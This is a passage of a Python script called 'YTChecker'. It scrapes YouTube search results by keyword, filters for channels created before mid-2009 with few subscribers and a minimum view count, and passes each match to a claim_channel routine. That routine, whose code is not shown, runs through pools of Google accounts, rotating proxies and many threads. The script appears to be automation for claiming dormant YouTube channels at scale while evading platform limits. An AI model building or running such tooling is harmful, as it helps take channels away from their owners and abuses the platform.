                months = ["Jan", "Feb", "Mar", "Apr", "May"]
                try:
                    if "M" in subs:
                        continue
                    elif "K" in subs and int(subs.split("K")[0]) > 50:
                        continue
                    elif "," in creation_date and int(creation_date.split(",")[-1].replace(" ", "")) > 2009:
                        continue
                    elif not "," in creation_date and int(creation_date.split(" ")[-1]) > 2009:
                        continue
                    elif "," in creation_date and int(creation_date.split(",")[-1].replace(" ", "")) == 2009 and not creation_date.split(" ")[0] in months:
                        continue
                    elif not "," in creation_date and int(creation_date.split(" ")[-1]) == 2009 and not creation_date.split(" ")[1] in months:
                        continue
                    else:
                        if config["minimum_views"] <= views:
                            urls_and_views.append([url, views])
                            print(f'{Fore.CYAN}[Thread {thread_number}] {Fore.MAGENTA}{url} {Fore.CYAN}is unchecked and meets requirements | Views: {views} | Subs: {subs}')
                except Exception as e:
                    print(f"{Fore.RED}[ERROR] Failed to check channel while scraping (2): [{Fore.WHITE}{url}{Fore.RED}]")
                    save_log(f"[ERROR] Failed to check channel while scraping (2):\n{e}\n")
    print(f"{Fore.MAGENTA}[Thread {thread_number}] Finished scraping keyword [{Fore.CYAN}{keyword}{Fore.MAGENTA}], found [{Fore.CYAN}{len(urls_and_views)}{Fore.MAGENTA}] unchecked channels meeting requirements")
    return(urls_and_views)

def worker(thread_number):
    global keywords_list
    global config
    counter = 0
    while True:
        try:
            keyword = keywords.get()
            if keyword == "NONEBREAKNONE":
                print(f"{Fore.GREEN}[Thread {thread_number}] No keywords left")
                break
            channels = scrape_channels_from_keyword(keyword, thread_number)
            for channel in channels:
                claim_channel(channel[0], channel[1], thread_number)
            keywords_list.remove(keyword)
            if thread_number == 1 and counter % config["autosave_intervall"] == 0:
                with open("./_data/keywords-new.txt", "w", encoding="utf-8") as f:
                    for item in keywords_list:
                        f.write("%s\n" % item)
                print(f"{Fore.WHITE}[Thread {thread_number}] Saved unchecked keywords")
            counter = counter+1
            keywords.task_done()
        except Exception as e:
            print(f'{Fore.MAGENTA}[Thread {thread_number}] {Fore.LIGHTRED_EX}[ERROR] Critical thread error.')
            save_log(f"[ERROR] Critical error in worker:\n{repr(e)}\n{e}\n")

if __name__ == '__main__': 
    with open("config.json", "r", encoding="utf-8") as config_file, open("keywords.txt", "r", encoding="utf-8") as keywords_file:
        config = json.load(config_file)
        keywords_list = keywords_file.read().splitlines()
        keywords = queue.Queue()
        for keyword in keywords_list:
            keywords.put(keyword)
        for i in range(config["threads"]):
            keywords.put("NONEBREAKNONE")
        accounts_1k_10k_count = len(config["accounts-1k-10k"])
        if accounts_1k_10k_count < 1:
            accounts_1k_10k_count_color = Fore.LIGHTRED_EX
        else:
            accounts_1k_10k_count_color = Fore.LIGHTGREEN_EX
        accounts_10k_100k_count = len(config["accounts-10k-100k"])
        if accounts_10k_100k_count < 1:
            accounts_10k_100k_count_color = Fore.LIGHTRED_EX
        else:
            accounts_10k_100k_count_color = Fore.LIGHTGREEN_EX
        accounts_100k_plus_count = len(config["accounts-100k+"])
        if accounts_100k_plus_count < 1:
            accounts_100k_plus_count_color = Fore.LIGHTRED_EX
        else:
            accounts_100k_plus_count_color = Fore.LIGHTGREEN_EX
        thread_settings = config["threads"]
        minimum_views_settings = config["minimum_views"]
        video_before_settings = config["video_before"]
        max_proxy_fails_settings = config["max_proxy_fails"]
        telegram_activated_settings = config["telegram_activated"]
        if telegram_activated_settings == True:
            telegram_activated_settings_color = Fore.LIGHTGREEN_EX
        else:
            telegram_activated_settings_color = Fore.LIGHTYELLOW_EX

    print(f"{Fore.RESET}--------------------YTChecker--------------------\nKeywords: [{Fore.LIGHTGREEN_EX}{len(keywords_list)}{Fore.RESET}]\nGoogle Accounts (1k-10k): [{accounts_1k_10k_count_color}{accounts_1k_10k_count}{Fore.RESET}]\nGoogle Accounts (10k-100k): [{accounts_10k_100k_count_color}{accounts_10k_100k_count}{Fore.RESET}]\nGoogle Accounts (100k+): [{accounts_100k_plus_count_color}{accounts_100k_plus_count}{Fore.RESET}]\nThreads: [{Fore.LIGHTGREEN_EX}{thread_settings}{Fore.RESET}]\nMinimum Views: [{Fore.LIGHTGREEN_EX}{minimum_views_settings}{Fore.RESET}]\nVideo before: [{Fore.LIGHTGREEN_EX}{video_before_settings}{Fore.RESET}]\nMax proxy Fails: [{Fore.LIGHTGREEN_EX}{max_proxy_fails_settings}{Fore.RESET}]\nTelegram activated: [{telegram_activated_settings_color}{telegram_activated_settings}{Fore.RESET}]\n-------------------------------------------------")
    input("Press ENTER to start")

    if not check_config() == True:
        input(f"{Fore.RED}[ERROR] Config isn't working, please fix and restart.")
    for i in range(config["threads"]):
        t = threading.Thread(target=worker, args=(i+1,))
        t.start()
        time.sleep(0.1)